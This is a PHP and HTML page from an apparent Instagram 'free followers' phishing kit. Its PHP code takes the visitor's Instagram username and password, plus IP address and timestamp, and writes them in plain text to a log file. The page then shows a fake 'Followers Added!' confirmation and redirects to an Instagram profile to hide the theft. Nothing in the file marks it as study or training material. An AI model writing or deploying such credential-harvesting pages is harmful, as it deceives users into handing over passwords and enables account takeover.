<?php
$username = $_POST['username'];
$password = $_POST['password'];
$followers = $_POST['followers'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

$data = "[$date] IP: $ip | IG Username: $username | Password: $password | Requested: $followers followers\n";
file_put_contents("log.txt", $data, FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing...</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial;
            margin: 0;
        }
        .success-box {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            animation: bounce 0.5s;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        @keyframes bounce {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .checkmark {
            width: 80px;
            height: 80px;
            background: #4CAF50;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            animation: check 0.5s ease-in-out;
        }
        @keyframes check {
            from { transform: scale(0); }
            to { transform: scale(1); }
        }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; margin: 5px 0; }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #833ab4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="success-box">
        <div class="checkmark">✓</div>
        <h2><?php echo htmlspecialchars($followers); ?> Followers Added!</h2>
        <p>Successfully added to @<?php echo htmlspecialchars($username); ?></p>
        <div class="loader"></div>
        <p>Redirecting to Instagram...</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = 'https://www.instagram.com/ayush_offlcial_?igsh=aDBvZ3NwdXNldTNm';
        }, 3000);
    </script>
</body>
</html>